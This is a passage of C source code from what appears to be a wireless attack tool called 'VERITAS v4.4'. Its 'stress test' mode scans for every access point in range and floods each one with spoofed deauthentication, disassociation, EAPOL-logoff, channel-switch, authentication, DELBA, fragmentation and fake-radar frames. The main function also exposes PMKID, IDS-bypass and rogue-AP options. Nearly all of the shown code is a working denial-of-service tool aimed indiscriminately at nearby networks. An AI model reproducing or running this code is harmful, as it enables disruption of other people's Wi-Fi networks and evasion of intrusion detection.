      if (off % 2 != 0)
        off++;
      off += 2; /* FHSS */
    }
    if (off < (int)rt_len) {
      return (int8_t)buf[off];
    }
  }
  return -100;
}

/* ---- Passive Beacon Scanner Thread ---- */

typedef struct {
  char iface[MAX_IFACE];
  stress_pool_t *pool;
} stress_scan_arg_t;

static void *stress_scanner_thread(void *arg) {
  stress_scan_arg_t *a = (stress_scan_arg_t *)arg;
  int sock = raw_socket(a->iface);
  if (sock < 0) {
    free(a);
    return NULL;
  }

  struct timeval tv = {.tv_sec = 0, .tv_usec = 200000};
  setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

  /* Ignore own injected packets */
#ifndef PACKET_IGNORE_OUTGOING
#define PACKET_IGNORE_OUTGOING 23
#endif
  int igo = 1;
  setsockopt(sock, SOL_PACKET, PACKET_IGNORE_OUTGOING, &igo, sizeof(igo));

  uint8_t buf[4096];
  while (!g_stop) {
    ssize_t n = recv(sock, buf, sizeof(buf), 0);
    if (n <= 36)
      continue;

    /* Parse radiotap length */
    uint16_t rt_len = 0;
    memcpy(&rt_len, buf + 2, 2);
    rt_len = le16toh(rt_len);
    dot11_t *d = (dot11_t *)(buf + rt_len);
    uint16_t fc = le16toh(d->fc);
    uint8_t type = (fc >> 2) & 0x03;
    uint8_t subtype = (fc >> 4) & 0x0F;

    /* Check management frames: Beacon (type=0, subtype=8), Probe Resp (0,5), Probe Req (0,4) */
    if (type != 0)
      continue;

    if (subtype == 8 || subtype == 5) {
      /* Beacon (8) or Probe Response (5) */
      uint8_t *bssid = d->a2;
      if (bssid[0] & 0x01)
        continue;

      int ie_off = rt_len + sizeof(dot11_t) + (subtype == 8 ? sizeof(beacon_fix_t) : 12);
      if (ie_off >= n)
        continue;

      char ssid[MAX_SSID_LEN + 1] = "";
      int channel = 0;

      while (ie_off + 2 <= (int)n) {
        uint8_t ie_id = buf[ie_off];
        uint8_t ie_len = buf[ie_off + 1];
        if (ie_off + 2 + ie_len > (int)n)
          break;

        if (ie_id == 0 && ie_len > 0 && ie_len <= MAX_SSID_LEN) {
          /* SSID IE */
          memcpy(ssid, buf + ie_off + 2, ie_len);
          ssid[ie_len] = 0;
          /* Filter non-printable SSIDs */
          bool printable = true;
          for (int j = 0; j < ie_len; j++) {
            if (ssid[j] < 0x20 || ssid[j] > 0x7E) {
              printable = false;
              break;
            }
          }
          if (!printable)
            ssid[0] = 0;
        } else if (ie_id == 3 && ie_len == 1) {
          /* DS Parameter Set → channel */
          channel = buf[ie_off + 2];
        }

        ie_off += 2 + ie_len;
      }

      int8_t rssi = parse_radiotap_rssi(buf, rt_len);
      if (channel > 0) {
        stress_pool_add(a->pool, bssid, ssid, channel, rssi);
      }
    } else if (subtype == 4) {
      /* Probe Request (4): unmask hidden SSIDs from directed client probe requests */
      int ie_off = rt_len + sizeof(dot11_t);
      if (ie_off >= n)
        continue;

      char ssid[MAX_SSID_LEN + 1] = "";
      while (ie_off + 2 <= (int)n) {
        uint8_t ie_id = buf[ie_off];
        uint8_t ie_len = buf[ie_off + 1];
        if (ie_off + 2 + ie_len > (int)n)
          break;

        if (ie_id == 0 && ie_len > 0 && ie_len <= MAX_SSID_LEN) {
          memcpy(ssid, buf + ie_off + 2, ie_len);
          ssid[ie_len] = 0;
          bool printable = true;
          for (int j = 0; j < ie_len; j++) {
            if (ssid[j] < 0x20 || ssid[j] > 0x7E) {
              printable = false;
              break;
            }
          }
          if (!printable)
            ssid[0] = 0;
          break;
        }
        ie_off += 2 + ie_len;
      }

      if (ssid[0] && !(d->a3[0] & 0x01)) {
        int8_t rssi = parse_radiotap_rssi(buf, rt_len);
        stress_pool_add(a->pool, d->a3, ssid, 0, rssi);
      }
    }

    /* Periodically age out stale entries */
    static int age_counter = 0;
    if (++age_counter >= 500) {
      age_counter = 0;
      stress_pool_age(a->pool);
    }
  }

  close(sock);
  free(a);
  return NULL;
}

/* ---- Channel Hopper Thread ---- */

typedef struct {
  char iface[MAX_IFACE];
  bool scan_5ghz;
  int dwell_ms;
} stress_hop_arg_t;

static void *stress_hopper_thread(void *arg) {
  stress_hop_arg_t *a = (stress_hop_arg_t *)arg;

  /* Build channel list */
  int chlist[N_CH_24 + N_CH_5];
  int nch = 0;
  for (int i = 0; i < N_CH_24; i++)
    chlist[nch++] = CH_24[i];
  if (a->scan_5ghz) {
    for (int i = 0; i < N_CH_5; i++)
      chlist[nch++] = CH_5[i];
  }

  int idx = 0;
  while (!g_stop) {
    int ch = chlist[idx % nch];
    set_ch(a->iface, ch);
    atomic_store(&g_stress_ch, ch);
    idx++;

    double dwell = (double)a->dwell_ms / 1000.0;
    usleep_precise(dwell);
  }

  free(a);
  return NULL;
}

/* ---- Multi-Target Injector Thread ---- */

typedef struct {
  stress_cfg_t *cfg;
  stress_pool_t *pool;
} stress_inj_arg_t;

static void *stress_injector_thread(void *arg) {
  stress_inj_arg_t *a = (stress_inj_arg_t *)arg;

  int sock = raw_socket(a->cfg->iface);
  if (sock < 0) {
    free(a);
    return NULL;
  }

  xorshift64_t rng;
  xs64_seed(&rng);

  /* Rate control per mode */
  double base_sleep;
  switch (a->cfg->mode) {
  case MODE_STEALTH:
    base_sleep = 0.08;
    break;
  case MODE_LOW:
    base_sleep = 0.04;
    break;
  case MODE_MEDIUM:
    base_sleep = 0.015;
    break;
  case MODE_HIGH:
    base_sleep = 0.005;
    break;
  case MODE_INSANE:
    base_sleep = 0.001;
    break;
  default:
    base_sleep = 0.015;
    break;
  }

  uint16_t seq = 0;
  stress_ap_t snap[STRESS_MAX_APS];

  while (!g_stop) {
    int nap = stress_pool_snapshot(a->pool, snap, STRESS_MAX_APS);
    if (nap == 0) {
      usleep_precise(0.5);
      continue;
    }

    /* Get current hopper channel */
    int cur_ch = atomic_load(&g_stress_ch);

    /* Inject into APs on the current channel only */
    for (int i = 0; i < nap && !g_stop; i++) {
      if (snap[i].channel != cur_ch)
        continue;

      uint8_t bss[6];
      memcpy(bss, snap[i].bssid, 6);

      uint8_t tmp[MAX_PKT_SIZE];
      int len;
      int sent_for_ap = 0;

      /* Build and inject selected vectors on-the-fly */
      if (a->cfg->vec_on[VEC_DEAUTH_FLOOD]) {
        /* Broadcast deauth */
        len = mk_deauth(tmp, bss, BCAST, 7, seq++);
        if (inject_one(sock, tmp, len) > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          sent_for_ap++;
        } else {
          atomic_fetch_add(&g_pkts_fail, 1);
        }

        /* Reverse deauth (client → AP spoof) */
        uint8_t fake_cli[6];
        rand_mac(fake_cli);
        len = mk_deauth_rev(tmp, bss, fake_cli, 6, seq++);
        if (inject_one(sock, tmp, len) > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          sent_for_ap++;
        } else {
          atomic_fetch_add(&g_pkts_fail, 1);
        }
      }

      if (a->cfg->vec_on[VEC_DISASSOC_FLOOD]) {
        len = mk_disassoc(tmp, bss, BCAST, 8, seq++);
        if (inject_one(sock, tmp, len) > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          sent_for_ap++;
        } else {
          atomic_fetch_add(&g_pkts_fail, 1);
        }
      }

      if (a->cfg->vec_on[VEC_EAPOL_LOGOFF]) {
        uint8_t fake_cli[6];
        rand_mac(fake_cli);
        len = mk_eapol_logoff(tmp, bss, fake_cli);
        if (inject_one(sock, tmp, len) > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          sent_for_ap++;
        } else {
          atomic_fetch_add(&g_pkts_fail, 1);
        }
      }

      if (a->cfg->vec_on[VEC_CSA_BEACON]) {
        /* CSA beacon: redirect to a random adjacent channel */
        int redir =
            snap[i].channel < 10 ? snap[i].channel + 3 : snap[i].channel - 3;
        if (redir < 1)
          redir = 11;
        const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
        len = mk_csa_beacon(tmp, bss, ssid, (uint8_t)snap[i].channel,
                            (uint8_t)redir);
        if (inject_one(sock, tmp, len) > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          sent_for_ap++;
        } else {
          atomic_fetch_add(&g_pkts_fail, 1);
        }
      }

      if (a->cfg->vec_on[VEC_BEACON_CONFUSION]) {
        const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
        len = mk_confusion_beacon(tmp, ssid, (uint8_t)snap[i].channel);
        if (inject_one(sock, tmp, len) > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          sent_for_ap++;
        } else {
          atomic_fetch_add(&g_pkts_fail, 1);
        }
      }

      if (a->cfg->vec_on[VEC_PROBE_RESPONSE_CSA]) {
        int redir =
            snap[i].channel < 10 ? snap[i].channel + 3 : snap[i].channel - 3;
        if (redir < 1)
          redir = 11;
        const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
        len = mk_probe_resp_csa(tmp, bss, BCAST, ssid, (uint8_t)snap[i].channel,
                                (uint8_t)redir);
        if (inject_one(sock, tmp, len) > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          sent_for_ap++;
        } else {
          atomic_fetch_add(&g_pkts_fail, 1);
        }
      }

      if (a->cfg->vec_on[VEC_AUTH_DOS]) {
        /* Auth flood with random source MAC */
        uint8_t fm[6];
        rand_mac(fm);
        len = mk_auth(tmp, bss, fm);
        if (inject_one(sock, tmp, len) > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          sent_for_ap++;
        } else {
          atomic_fetch_add(&g_pkts_fail, 1);
        }
      }

      if (a->cfg->vec_on[VEC_CSA_ACTION]) {
        int redir =
            snap[i].channel < 10 ? snap[i].channel + 3 : snap[i].channel - 3;
        if (redir < 1)
          redir = 11;
        len = mk_csa_action(tmp, bss, BCAST, (uint8_t)redir);
        if (inject_one(sock, tmp, len) > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          sent_for_ap++;
        } else {
          atomic_fetch_add(&g_pkts_fail, 1);
        }
      }

      if (a->cfg->vec_on[VEC_QUIET_ELEMENT]) {
        const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
        len = mk_quiet_beacon(tmp, bss, ssid, (uint8_t)snap[i].channel);
        if (inject_one(sock, tmp, len) > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          sent_for_ap++;
        } else {
          atomic_fetch_add(&g_pkts_fail, 1);
        }
      }

      if (a->cfg->vec_on[VEC_DELBA_ATTACK]) {
        len = mk_delba(tmp, bss, BCAST);
        if (inject_one(sock, tmp, len) > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          sent_for_ap++;
        } else {
          atomic_fetch_add(&g_pkts_fail, 1);
        }
      }

      if (a->cfg->vec_on[VEC_FRAGATTACK]) {
        uint8_t fake_cli[6];
        rand_mac(fake_cli);
        uint16_t fseq = (uint16_t)(xs64_next(&rng) % 4096);
        int len0 = mk_frag_setup(tmp, bss, fake_cli, fseq);
        uint8_t tmp1[MAX_PKT_SIZE];
        int len1 = mk_frag_payload(tmp1, bss, fake_cli, fseq, NULL, 0);

        if (inject_one(sock, tmp, len0) > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          sent_for_ap++;
        } else {
          atomic_fetch_add(&g_pkts_fail, 1);
        }
        if (inject_one(sock, tmp1, len1) > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          sent_for_ap++;
        } else {
          atomic_fetch_add(&g_pkts_fail, 1);
        }
      }

      if (a->cfg->vec_on[VEC_DFS_FAKE_RADAR]) {
        uint8_t fake_cli[6];
        rand_mac(fake_cli);
        uint8_t cur = (uint8_t)snap[i].channel;
        uint8_t safe = pick_safe_ch(cur, 36);
        const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";

        len = mk_dfs_radar_report(tmp, bss, fake_cli, cur);
        if (inject_one(sock, tmp, len) > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          sent_for_ap++;
        } else {
          atomic_fetch_add(&g_pkts_fail, 1);
        }

        len = mk_dfs_vacate_csa(tmp, bss, ssid, cur, safe);
        if (inject_one(sock, tmp, len) > 0) {
          atomic_fetch_add(&g_pkts_sent, 1);
          sent_for_ap++;
        } else {
          atomic_fetch_add(&g_pkts_fail, 1);
        }
      }

      /* Update per-AP counter */
      pthread_mutex_lock(&a->pool->lock);
      for (int j = 0; j < a->pool->count; j++) {
        if (memcmp(a->pool->aps[j].bssid, bss, 6) == 0) {
          a->pool->aps[j].tx_count += (uint64_t)sent_for_ap;
          break;
        }
      }
      pthread_mutex_unlock(&a->pool->lock);

      /* Small inter-AP delay */
      usleep_precise(base_sleep);
    }

    /* Inter-round sleep */
    usleep_precise(base_sleep * 2);
  }

  close(sock);
  free(a);
  return NULL;
}

/* ---- Stress Display Thread ---- */

typedef struct {
  stress_cfg_t *cfg;
  stress_pool_t *pool;
} stress_disp_arg_t;

static void *stress_display_thread(void *arg) {
  stress_disp_arg_t *d = (stress_disp_arg_t *)arg;

  printf("\033[?25l\033[2J\033[H");
  fflush(stdout);

  while (!g_stop) {
    double elapsed = mono_time() - g_start_time;
    int h = (int)(elapsed / 3600), m = (int)(fmod(elapsed, 3600) / 60),
        s = (int)(fmod(elapsed, 60));

    uint64_t sent = atomic_load(&g_pkts_sent);
    uint64_t fail = atomic_load(&g_pkts_fail);
    double pps = elapsed > 0.05 ? (double)sent / elapsed : 0;

    int naps = atomic_load(&g_stress_aps_seen);
    int cur_ch = atomic_load(&g_stress_ch);

    int tw, th;
    get_term_size(&tw, &th);
    (void)tw;

    printf("\033[H");

    printf("  " C_DEEP_B
           "╔══════════════════════════════════════════════════════════╗" RST
           "\n");
    printf(
        "  ║" C_RED BLD
        "   VERITAS v4.4 — STRESS TEST (MASS INJECTION)           " RST C_DEEP_B
        "║" RST "\n");
    printf("  " C_DEEP_B
           "╠══════════════════════════════════════════════════════════╣" RST
           "\n");
    printf("  ║ " C_GRAY "IF  " RST C_CYAN "%-20s" RST "  " C_GRAY
           "MODE " RST C_RED "%-18s" RST "║\033[K\n",
           d->cfg->iface, MODE_NAMES[d->cfg->mode]);
    printf("  ║ " C_GRAY "APs " RST C_AQUA "%-4d" RST " discovered"
           "        " C_GRAY "CH " RST C_YELLOW "%3d" RST " / " C_ICE "%d" RST
           "          ║\033[K\n",
           naps, cur_ch, d->cfg->scan_5ghz ? N_CH_24 + N_CH_5 : N_CH_24);

    char pps_str[32];
    if (pps >= 1000)
      snprintf(pps_str, sizeof(pps_str), "%.1fK pps", pps / 1000);
    else
      snprintf(pps_str, sizeof(pps_str), "%.0f pps", pps);

    printf("  ║ " C_GRAY "TX  " RST C_AQUA "%-12lu" RST "  " C_GRAY "FAIL " RST
           "%s%-6lu" RST "  " C_GRAY "RATE " RST C_ICE "%-10s" RST "║\033[K\n",
           (unsigned long)sent, fail > 0 ? C_RED : C_GRAY, (unsigned long)fail,
           pps_str);
    printf("  ║ " C_GRAY "TIME" RST " " C_CYAN "%02d:%02d:%02d" RST
           "                                             ║\033[K\n",
           h, m, s);

    /* Active vectors */
    printf("  " C_DEEP_B
           "╠══════════════════════════════════════════════════════════╣" RST
           "\n");
    printf("  ║ " C_GRAY "  CH  BSSID              SSID              PWR"
           "        TX" RST "  ║\033[K\n");
    printf("  " C_DEEP_B
           "╠══════════════════════════════════════════════════════════╣" RST
           "\n");

    /* Show AP table */
    stress_ap_t snap[STRESS_MAX_APS];
    int nsnap = stress_pool_snapshot(d->pool, snap, STRESS_MAX_APS);

    /* Sort by channel */
    for (int i = 0; i < nsnap - 1; i++)
      for (int j = i + 1; j < nsnap; j++)
        if (snap[j].channel < snap[i].channel) {
          stress_ap_t tmp = snap[i];
          snap[i] = snap[j];
          snap[j] = tmp;
        }

    int max_rows = th - 16;
    if (max_rows < 3)
      max_rows = 3;
    int show = nsnap > max_rows ? max_rows : nsnap;

    for (int i = 0; i < show; i++) {
      uint64_t atx = snap[i].tx_count;
      char ssid_disp[48];
      if (snap[i].ssid[0]) {
        snprintf(ssid_disp, sizeof(ssid_disp), "%.16s", snap[i].ssid);
      } else {
        snprintf(ssid_disp, sizeof(ssid_disp), C_DIM_GRAY "<hidden>" RST);
      }

      char rssi_str[32];
      if (snap[i].rssi < 0 && snap[i].rssi > -120) {
        const char *rc = (snap[i].rssi > -60)
                             ? C_GREEN
                             : ((snap[i].rssi > -78) ? C_YELLOW : C_RED);
        snprintf(rssi_str, sizeof(rssi_str), "%s%3d dBm" RST, rc, snap[i].rssi);
      } else {
        snprintf(rssi_str, sizeof(rssi_str), C_GRAY "n/a    " RST);
      }

      char tx_str[16];
      if (atx >= 1000000)
        snprintf(tx_str, sizeof(tx_str), "%.1fM", (double)atx / 1e6);
      else if (atx >= 1000)
        snprintf(tx_str, sizeof(tx_str), "%.1fK", (double)atx / 1e3);
      else
        snprintf(tx_str, sizeof(tx_str), "%lu", (unsigned long)atx);

      printf("  ║ %s%3d" RST "  %-18s %-16s %-14s %-6s ║\033[K\n",
             snap[i].channel == cur_ch ? C_GREEN : C_GRAY, snap[i].channel,
             snap[i].bssid_str, ssid_disp, rssi_str, tx_str);
    }
    if (nsnap > show)
      printf("  ║ " C_DIM_GRAY "  ... +%d more APs" RST
             "                                     ║\033[K\n",
             nsnap - show);

    printf("  " C_DEEP_B
           "╚══════════════════════════════════════════════════════════╝" RST
           "\n");
    printf("  " C_DIM_GRAY "[" C_RED "Ctrl+C" RST C_DIM_GRAY "]" RST
           " stop   " C_GRAY "APs:" RST C_AQUA "%d" RST "  " C_GRAY
           "TX:" RST C_AQUA "%lu" RST "  " C_GRAY "%s" RST "\n",
           naps, (unsigned long)sent, pps_str);
    printf("\033[J");
    fflush(stdout);

    usleep_precise(0.15);
  }

  printf("\033[?25h");
  fflush(stdout);
  free(d);
  return NULL;
}

/* Audit Report Exporter (JSON / CSV) */
static void export_report(const char *path, const stress_pool_t *pool,
                          double elapsed, uint64_t sent, uint64_t fail) {
  if (!path || !path[0])
    return;
  FILE *fp = fopen(path, "w");
  if (!fp) {
    fprintf(stderr,
            "  " C_RED "[!] Failed to write export report to '%s'" RST "\n",
            path);
    return;
  }

  bool is_csv = (strstr(path, ".csv") != NULL);
  if (is_csv) {
    fprintf(fp, "bssid,ssid,channel,rssi,tx_count\n");
    pthread_mutex_lock((pthread_mutex_t *)&pool->lock);
    for (int i = 0; i < pool->count; i++) {
      fprintf(fp, "\"%s\",\"%s\",%d,%d,%lu\n", pool->aps[i].bssid_str,
              pool->aps[i].ssid, pool->aps[i].channel, pool->aps[i].rssi,
              (unsigned long)pool->aps[i].tx_count);
    }
    pthread_mutex_unlock((pthread_mutex_t *)&pool->lock);
  } else {
    /* JSON Export */
    fprintf(fp,
            "{\n  \"timestamp\": %ld,\n  \"elapsed_seconds\": %.1f,\n  "
            "\"pkts_sent\": %lu,\n  \"pkts_fail\": %lu,\n  \"aps_count\": %d,\n "
            " \"aps\": [\n",
            (long)time(NULL), elapsed, (unsigned long)sent,
            (unsigned long)fail, pool->count);
    pthread_mutex_lock((pthread_mutex_t *)&pool->lock);
    for (int i = 0; i < pool->count; i++) {
      fprintf(fp,
              "    {\"bssid\": \"%s\", \"ssid\": \"%s\", \"channel\": %d, "
              "\"rssi\": %d, \"tx_count\": %lu}%s\n",
              pool->aps[i].bssid_str, pool->aps[i].ssid, pool->aps[i].channel,
              pool->aps[i].rssi, (unsigned long)pool->aps[i].tx_count,
              (i < pool->count - 1) ? "," : "");
    }
    pthread_mutex_unlock((pthread_mutex_t *)&pool->lock);
    fprintf(fp, "  ]\n}\n");
  }
  fclose(fp);
  printf("  " C_GREEN "[✓] Audit report exported to: %s" RST "\n", path);
}

/* ---- Stress Test Orchestrator ---- */

static void run_stress(stress_cfg_t *cfg) {
  printf("\n  " C_RED BLD
         "╔═══════════════════════════════════════════════╗" RST "\n");
  printf("  " C_RED BLD "║  STRESS TEST — MASS INJECTION ACTIVE          ║" RST
         "\n");
  printf("  " C_RED BLD "║  All Wi-Fi signals in range will be targeted  ║" RST
         "\n");
  printf("  " C_RED BLD "╚═══════════════════════════════════════════════╝" RST
         "\n\n");

  printf("  " C_GRAY "Interface:" RST " " C_CYAN "%s" RST "\n", cfg->iface);
  printf("  " C_GRAY "Mode:     " RST " " C_RED "%s" RST "\n",
         MODE_NAMES[cfg->mode]);
  printf("  " C_GRAY "Band:     " RST " " C_ICE "%s" RST "\n",
         cfg->scan_5ghz ? "2.4GHz + 5GHz" : "2.4GHz only");
  printf("  " C_GRAY "Vectors:  " RST " " C_AQUA "%d active" RST "\n",
         cfg->nvec);
  if (cfg->duration > 0)
    printf("  " C_GRAY "Duration: " RST " " C_YELLOW "%ds" RST "\n",
           cfg->duration);

  /* Active vector list */
  for (int v = 0; v < VEC_COUNT; v++) {
    if (cfg->vec_on[v])
      printf("    " C_GREEN "▸" RST " %s\n", VEC_NAMES[v]);
  }

  printf("\n  " C_RED BLD "Deploy mass injection? " RST "(y/N): ");
  fflush(stdout);
  char buf[32];
  if (!fgets(buf, sizeof(buf), stdin) || buf[0] != 'y') {
    printf("  Cancelled.\n");
    return;
  }

  printf("\n  " C_GREEN "[✓] Scanning and injecting..." RST "\n\n");

  /* Initialize pool */
  stress_pool_t pool;
  stress_pool_init(&pool);

  g_stop = 0;
  g_stress_aps_seen = 0;
  g_start_time = mono_time();
  g_pkts_sent = 0;
  g_pkts_fail = 0;
  signal(SIGINT, sig_handler);
  signal(SIGTERM, sig_handler);

  /* Dwell time per mode */
  int dwell_ms;
  switch (cfg->mode) {
  case MODE_STEALTH:
    dwell_ms = 500;
    break;
  case MODE_LOW:
    dwell_ms = 350;
    break;
  case MODE_MEDIUM:
    dwell_ms = 200;
    break;
  case MODE_HIGH:
    dwell_ms = 100;
    break;
  case MODE_INSANE:
    dwell_ms = 50;
    break;
  default:
    dwell_ms = 200;
    break;
  }

  /* Start scanner thread */
  stress_scan_arg_t *sa = calloc(1, sizeof(*sa));
  snprintf(sa->iface, MAX_IFACE, "%s", cfg->iface);
  sa->pool = &pool;
  pthread_t scan_t;
  pthread_create(&scan_t, NULL, stress_scanner_thread, sa);

  /* Start hopper thread */
  stress_hop_arg_t *ha = calloc(1, sizeof(*ha));
  snprintf(ha->iface, MAX_IFACE, "%s", cfg->iface);
  ha->scan_5ghz = cfg->scan_5ghz;
  ha->dwell_ms = dwell_ms;
  pthread_t hop_t;
  pthread_create(&hop_t, NULL, stress_hopper_thread, ha);

  /* Wait for initial AP discovery (2 seconds scan before injection) */
  printf("  Discovering targets");
  for (int i = 0; i < 20 && !g_stop; i++) {
    usleep_precise(0.1);
    printf(".");
    fflush(stdout);
  }
  printf(" " C_AQUA "%d APs found" RST "\n\n", atomic_load(&g_stress_aps_seen));

  /* Start injector threads (2 for throughput) */
  pthread_t inj_t[2];
  int n_inj = 0;
  for (int i = 0; i < 2 && !g_stop; i++) {
    stress_inj_arg_t *ia = calloc(1, sizeof(*ia));
    ia->cfg = cfg;
    ia->pool = &pool;
    if (pthread_create(&inj_t[n_inj], NULL, stress_injector_thread, ia) == 0)
      n_inj++;
    else
      free(ia);
  }

  /* Start display thread */
  stress_disp_arg_t *da = calloc(1, sizeof(*da));
  da->cfg = cfg;
  da->pool = &pool;
  pthread_t disp_t;
  pthread_create(&disp_t, NULL, stress_display_thread, da);

  /* Wait for duration or Ctrl+C */
  if (cfg->duration > 0) {
    double end = mono_time() + cfg->duration;
    while (!g_stop && mono_time() < end)
      usleep_precise(0.5);
    g_stop = 1;
  } else {
    while (!g_stop)
      usleep_precise(0.5);
  }

  /* Cleanup */
  pthread_join(scan_t, NULL);
  pthread_join(hop_t, NULL);
  for (int i = 0; i < n_inj; i++)
    pthread_join(inj_t[i], NULL);
  pthread_join(disp_t, NULL);

  /* Summary */
  printf("\033[?25h\033[2J\033[H");
  double elapsed = mono_time() - g_start_time;
  uint64_t sent = atomic_load(&g_pkts_sent);
  uint64_t fail = atomic_load(&g_pkts_fail);
  int final_aps = atomic_load(&g_stress_aps_seen);
  double pps = elapsed > 0 ? (double)sent / elapsed : 0;

  printf("\n  " C_DEEP_B
         "╔══════════════════════════════════════════════════════════╗" RST
         "\n");
  printf(
      "  ║" C_AQUA BLD
      "      STRESS TEST COMPLETE                               " RST C_DEEP_B
      "║" RST "\n");
  printf("  " C_DEEP_B
         "╠══════════════════════════════════════════════════════════╣" RST
         "\n");
  printf("  ║ " C_GRAY "Interface " RST "  " C_CYAN "%-46s" RST "║\n",
         cfg->iface);
  printf("  ║ " C_GRAY "APs Hit   " RST "  " C_AQUA "%-46d" RST "║\n",
         final_aps);
  printf("  ║ " C_GRAY "Duration  " RST "  " C_ICE "%02d:%02d:%02d" RST
         "                                       ║\n",
         (int)(elapsed / 3600), (int)(fmod(elapsed, 3600) / 60),
         (int)(fmod(elapsed, 60)));
  printf("  ║ " C_GRAY "Packets   " RST "  " C_AQUA "%-46lu" RST "║\n",
         (unsigned long)sent);
  printf("  ║ " C_GRAY "Rate      " RST "  " C_ICE "%.1f pps" RST
         "                                       ║\n",
         pps);
  printf("  ║ " C_GRAY "Failures  " RST "  %s%-46lu" RST "║\n",
         fail > 0 ? C_RED : C_GRAY, (unsigned long)fail);
  printf("  " C_DEEP_B
         "╚══════════════════════════════════════════════════════════╝" RST
         "\n\n");

  /* Restore channel 1 */
  set_ch(cfg->iface, 1);
  export_report(cfg->export_file, &pool, elapsed, sent, fail);
  pthread_mutex_destroy(&pool.lock);
}

/* ============================================================
 *               MAIN
 * ============================================================ */

int main(int argc, char **argv) {
  srand((unsigned)time(NULL) ^ (unsigned)getpid());

  if (getuid() != 0) {
    printf(C_RED "[!] Run as root" RST "\n");
    return 1;
  }

  /* [FIX 40] --help */
  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
      print_help();
      return 0;
    }
  }

  /* Script mode */
  if (argc >= 3 && strcmp(argv[1], "--script") == 0) {
    system("clear");
    printf("%s\n", BANNER);
    if (!preflight())
      return 1;
    run_script(argv[2]);
    return 0;
  }

  system("clear");
  printf("%s\n", BANNER);
  if (!preflight())
    return 1;

  /* Check for --stress flag */
  bool stress_mode = false;
  bool stress_5ghz = false;
  char export_file[MAX_PATH_LEN] = "";
  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "--stress") == 0)
      stress_mode = true;
    if (strcmp(argv[i], "--5ghz") == 0)
      stress_5ghz = true;
    if (strcmp(argv[i], "--export") == 0 && i + 1 < argc)
      snprintf(export_file, MAX_PATH_LEN, "%s", argv[++i]);
  }

  if (stress_mode) {
    /* === STRESS TEST MODE === */
    stress_cfg_t scfg = {0};
    scfg.mode = MODE_MEDIUM;
    scfg.scan_5ghz = stress_5ghz;

    /* Interface selection */
    menu_iface(scfg.iface, sizeof(scfg.iface));

    /* Vector selection */
    printf("\n  " C_CYAN BLD "Stress Vectors" RST "\n\n");
    printf("  Use default stress vectors (Deauth+Disassoc+CSA+Auth)?\n");
    printf("  " C_AQUA "Y" RST " = Default    " C_AQUA "N" RST
           " = Custom selection\n\n");
    char buf[32];
    printf("  Default? " C_GRAY "[Y]" RST ": ");
    fflush(stdout);
    if (!fgets(buf, sizeof(buf), stdin))
      exit(0);

    if (buf[0] == 'n' || buf[0] == 'N') {
      config_t tmp = {0};
      menu_vectors(&tmp);
      memcpy(scfg.vec_on, tmp.vec_on, sizeof(scfg.vec_on));
      scfg.nvec = tmp.nvec;
    } else {
      /* Default stress vectors */
      scfg.vec_on[VEC_DEAUTH_FLOOD] = true;
      scfg.vec_on[VEC_DISASSOC_FLOOD] = true;
      scfg.vec_on[VEC_CSA_BEACON] = true;
      scfg.vec_on[VEC_AUTH_DOS] = true;
      scfg.nvec = 4;
    }

    /* Mode selection */
    scfg.mode = menu_mode();

    /* Duration */
    printf("\n  Duration (seconds, 0=unlimited) " C_GRAY "[0]" RST ": ");
    fflush(stdout);
    if (fgets(buf, sizeof(buf), stdin)) {
      int d = atoi(buf);
      if (d > 0)
        scfg.duration = d;
    }

    run_stress(&scfg);
    return 0;
  }

  /* === NORMAL TARGETED MODE === */

  /* [FIX 36] Parse CLI flags */
  config_t cfg = {0};
  bool cli_pmkid = false, cli_bypass = false, cli_rogue = false;
  const char *cli_stats = NULL;

  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "--pmkid") == 0)
      cli_pmkid = true;
    else if (strcmp(argv[i], "--ids-bypass") == 0)
      cli_bypass = true;
    else if (strcmp(argv[i], "--rogue") == 0)
      cli_rogue = true;
    else if (strcmp(argv[i], "--dual") == 0 && i + 1 < argc) {
      snprintf(cfg.iface2, MAX_IFACE, "%s", argv[++i]);
      cfg.dual_radio = true;
    } else if (strcmp(argv[i], "--stats") == 0 && i + 1 < argc) {
      cli_stats = argv[++i];
    } else if (strcmp(argv[i], "--export") == 0 && i + 1 < argc) {
      snprintf(export_file, MAX_PATH_LEN, "%s", argv[++i]);
    }
  }

  char iface[MAX_IFACE];
  menu_iface(iface, sizeof(iface));

  target_ap_t tgt = {0};
  menu_target(iface, &tgt);
  printf("\n  Target: " C_ICE "%s" RST " (%s) ch %d\n", tgt.bssid, tgt.ssid,
         tgt.channel);

  char dch[16];
  snprintf(dch, sizeof(dch), "%d", tgt.channel < 14 ? tgt.channel + 1 : 1);
  char ncs[16];
  input_prompt("Redirect channel", ncs, sizeof(ncs), vch,
               "Invalid (1-14/36-165)", dch);
  int new_ch = atoi(ncs);

  /* [FIX 46] DFS redirect info */
  if (is_dfs_ch(new_ch))
    printf("  " C_YELLOW "[DFS] Channel %d is DFS — clients must wait for CAC "
                         "(~60s) to use it" RST "\n",
           new_ch);

  printf("\n  1. Broadcast (all clients)\n  2. Specific MAC\n\n");
  char buf[32];
  printf("  Client [1-2] " C_GRAY "[1]" RST ": ");
  fflush(stdout);
  if (!fgets(buf, sizeof(buf), stdin))
    exit(0);
